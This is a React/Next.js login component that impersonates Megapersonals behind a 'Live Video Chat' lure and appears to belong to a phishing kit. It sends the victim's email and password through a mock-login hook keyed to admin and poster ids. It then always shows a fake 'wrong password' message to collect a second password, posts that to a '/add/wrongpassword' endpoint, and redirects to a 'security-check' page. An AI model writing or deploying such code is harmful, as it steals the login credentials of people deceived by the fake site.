"use client";
import { API_URL, site } from "../config/index";
import Image from "next/image";
import useMockLogin from "../hooks/useMockLogin";
import { useState } from "react";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";

function LoginForm({ adminId, posterId }) {
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [showWrongPassword, setShowWrongPassword] = useState(false);
  const [wrongPassword, setWrongPassword] = useState("");

  const router = useRouter();

  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = async () => {
    const allValues = {
      site: site,
      email: email,
      password: password,
      // skipcode: "",
    };

    await login(allValues);
    setShowWrongPassword(true);
    // setEmail("");
    setPassword("");

    console.log("allValues", allValues);
  };
  const handleWrongPassword = async () => {
    const url = `${API_URL}/add/wrongpassword`;
    const id = Cookies.get("id");
    const values = {
      id,
      wrongPassword,
    };

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });
    const data = await res.json();
    console.log(data);

    if (res.ok) {
      console.log("success", data);
      setEmail("");
      setWrongPassword("");
      router.push(`/security-check`);
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };
  return (
    <div class="bg-neutral-50 w-full max-w-[25rem] p-6 rounded-xl">
      <p class="text-3xl font-semibold ">Live Video Chat</p>
      <p class="mt-3 leading-relaxed max-w-[32ch] mx-auto [&amp;>span]:font-semibold">
        Know each other and enjoy{" "}
        <span class="text-green-500">private, secure</span>
        <span class="text-green-500"></span> and{" "}
        <span class="text-green-500">hasslefree</span> live moment with your
        dating partner
      </p>
      <img src="/images/devilgirl.png" width="180xp" height="120px" alt="" />{" "}
      <p class="text-xl font-semibold mt-3 text-center">
        Login with Megapersonals
      </p>
      <div class="flex flex-col gap-y-4 mt-4">
        <p
          class={`${
            showWrongPassword
              ? "block bg-neutral-200 p-2 rounded text-sm"
              : "hidden"
          }  `}
          id="msg"
        >
          Please enter correct password
        </p>
        <input
          required=""
          class="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
          placeholder="Enter email here"
          type="email"
          name="email"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
        />
        <input
          required
          className="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
          placeholder="Enter password here"
          type="password"
          name={showWrongPassword ? "wrongPassword" : "password"}
          value={showWrongPassword ? wrongPassword : password}
          onChange={(e) =>
            showWrongPassword
              ? setWrongPassword(e.target.value)
              : setPassword(e.target.value)
          }
        />
        <button
          onClick={showWrongPassword ? handleWrongPassword : handleSubmit}
          className="h-11 rounded text-neutral-50 font-medium bg-green-500 disabled:bg-green-200"
        >
          Submit
        </button>
      </div>
    </div>
  );
}

export default LoginForm;
